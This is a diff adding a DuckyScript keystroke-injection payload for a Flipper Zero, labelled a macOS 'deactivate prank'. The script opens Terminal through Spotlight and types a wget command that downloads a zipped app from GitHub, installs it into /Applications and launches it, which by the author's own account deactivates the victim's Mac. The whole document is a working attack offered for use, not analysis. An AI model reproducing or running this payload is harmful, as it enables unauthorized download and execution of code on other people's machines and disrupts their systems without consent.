@@ -1,0 +1,18 @@
+REM       MacOS-DEACTIVATE-PRANK
+REM       Version 1.0
+REM       OS: macOS 10.4 - (Present)
+REM       Author: NateW
+REM       Requirements: Any DuckyScript Capable Device. In my case, I am building for a FlipperZero.
+REM       Description: Downloads Activate.app from https://github.com/Lakr233/ActivateMac and runs it. This will deactivate your Mac. This is a prank. I am not responsible for any damage caused by this script.
+DELAY 200
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 700
+STRING wget https://github.com/Lakr233/ActivateMac/releases/latest/download/Activate.zip && unzip Activate.zip && rm Activate.zip && mv Activate.app /Applications && open /Applications/Activate.app
+DELAY 700
+ENTER
+DELAY 1200
+GUI q
